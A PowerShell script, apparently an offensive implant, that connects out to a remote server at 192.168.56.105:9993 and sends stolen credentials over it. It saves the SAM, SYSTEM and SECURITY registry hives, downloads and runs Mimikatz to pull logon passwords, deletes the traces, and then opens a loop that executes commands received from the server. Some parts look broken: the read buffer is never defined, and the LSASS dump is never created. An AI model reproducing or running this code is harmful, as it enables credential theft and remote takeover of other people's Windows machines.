# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9993

# Create a TCP client object
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)

# Create a stream object for sending and receiving data
$stream = $tcpClient.GetStream()
$writer = [System.IO.StreamWriter]::new($stream)
$reader = [System.IO.StreamReader]::new($stream)

# Writes a string to the server
function WriteToStream ($String) {
    # Write to the server
    $writer.WriteLine($String)
    $writer.Flush()
}

# Function to execute commands and send output to the server
function ExecuteCommandAndSendOutput($Command) {
    # Execute command and save output (including errors thrown)
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    
    # Write output to the server
    WriteToStream ($Output)
}

# Function to check for stored credentials and send to the server
function CheckStoredCredentials {
    ExecuteCommandAndSendOutput "Get-StoredCredential | Format-List"
}

# Function to dump password hashes from the SAM database and send to the server
function DumpPasswordHashes {
    # Dump password hashes from the SAM database
    reg save HKLM\SYSTEM $env:TEMP\system.sav
    reg save HKLM\SAM $env:TEMP\sam.sav
    reg save HKLM\SECURITY $env:TEMP\security.sav

    # Use Mimikatz to extract password hashes from the SAM database
    $mimikatzDir = "$env:TEMP\mimikatz_trunk"
    $mimikatzZip = "$env:TEMP\mimikatz.zip"
    $mimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210804/mimikatz_trunk.zip"
    Invoke-WebRequest $mimikatzUrl -OutFile $mimikatzZip
    Expand-Archive $mimikatzZip -DestinationPath $env:TEMP
    $dump = . "$mimikatzDir\x64\mimikatz.exe" "privilege::debug" "sekurlsa::minidump $env:TEMP\lsass.dmp" "sekurlsa::logonpasswords" "exit"
    Remove-Item "$env:TEMP\lsass.dmp" -Force
    Remove-Item "$env:TEMP\system.sav" -Force
    Remove-Item "$env:TEMP\sam.sav" -Force
    Remove-Item "$env:TEMP\security.sav" -Force
    
    # Send dump output to the server
    WriteToStream $dump
}

# Send stored credentials to the server
WriteToStream "Stored Credentials:`n"
CheckStoredCredentials

# Send password hashes to the server
WriteToStream "Password Hashes:`n"
DumpPasswordHashes

# Initial output to the server
WriteToStream ""

# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and send output to the server
    ExecuteCommandAndSendOutput $Command
}

# Close the writer and the underlying TCPClient
$writer.Close()
